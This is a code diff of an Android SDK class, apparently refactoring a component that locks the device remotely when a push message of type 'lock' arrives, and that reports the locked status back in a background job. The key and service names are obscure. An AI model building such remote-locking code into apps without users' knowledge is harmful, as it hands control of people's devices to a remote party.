@@ -13,10 +13,11 @@ import com.evernote.android.job.util.support.PersistableBundleCompat;
 import java.util.concurrent.TimeUnit;
 
 import commons.app.com.commons.commons.SdkComponent;
+import timber.log.Timber;
 import tools.app.com.loc_service.sys.LoTempActivity;
 import tools.app.com.loc_service.sys.LoTestTempService;
-import timber.log.Timber;
 
+@SuppressWarnings("WeakerAccess")
 public class LockerComponent extends SdkComponent {
 
     public static final String ARG_IS_LOCKED = "l37362673_arg_1";
@@ -32,14 +33,17 @@ public class LockerComponent extends SdkComponent {
         instance = this;
     }
 
+    @Nullable
     @Override
-    public void onDeviceRegistered() {
-
+    public Job createJob(@NonNull String tag) {
+        if (JOB_TAG_SEND_LOCKED_STATUS.equals(tag)) {
+            return new SendDeviceLockedStatusJob();
+        }
+        return null;
     }
 
     @Override
-    public void onFcmMessageReceived(Bundle payload) {
-        String type = payload.getString("type");
+    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
         if ("lock".equals(type)) {
             String lock = payload.getString("lock", "false");
             if (lock.equals("true")) {
@@ -50,19 +54,9 @@ public class LockerComponent extends SdkComponent {
         }
     }
 
-    @Override
-    public void onDeviceRebooted() {
-
-    }
-
-    @Nullable
-    @Override
-    public Job createJob(@NonNull String tag) {
-        if (JOB_TAG_SEND_LOCKED_STATUS.equals(tag)) {
-            return new SendDeviceLockedStatusJob();
-        }
-        return null;
-    }
+    ///////////////////////////////////////////////////////////////////////////
+    // INNER
+    ///////////////////////////////////////////////////////////////////////////
 
     public void lockDevice() {
         if (LoTestTempService.getInstance() == null) {
